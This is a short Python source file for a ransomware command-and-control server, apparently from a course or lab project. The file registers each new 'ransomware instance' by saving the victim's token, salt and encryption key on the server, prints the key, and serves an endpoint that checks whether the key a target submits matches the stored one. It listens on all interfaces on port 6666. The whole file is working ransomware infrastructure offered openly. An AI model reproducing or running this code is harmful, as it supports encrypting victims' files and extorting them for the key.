import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        os.makedirs('/root/CNC', exist_ok=True)

        token = base64.b64decode(body["token"])
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])

        folder_token_name = "/root/CNC/" + str(token.hex()) 

        os.makedirs(folder_token_name, exist_ok=True)
        os.chdir(folder_token_name)

        with open(folder_token_name + "/key.bin", "wb") as f:
            f.write(key)
        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(salt)
        print("\n\nKey of the token "+token.hex()+" is ", str(base64.b64encode(key), encoding="utf-8"))
        return {"status":"KO"}
    
    def post_key(self, path:str, params:dict, body:dict)->dict:
        # used to verify ifthe received key from the target matches with with the key in cnc
        
        #going to the path of the key.bin
        token = body["token"]
        folder_token_name = "/root/CNC/" + token
        file_path = folder_token_name + "/key.bin" 
        
        key_test = base64.b64decode(body["key"]) # key that the target had entered

        # extracting the right key from the cnc
        try:
            f = open(file_path, "rb")
            key = f.read()
        except:
            return {"valide":-1}
        f.close()

        #verifying
        if(key_test == key):

            return {"valide": 1}

        return {"valide": 0}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()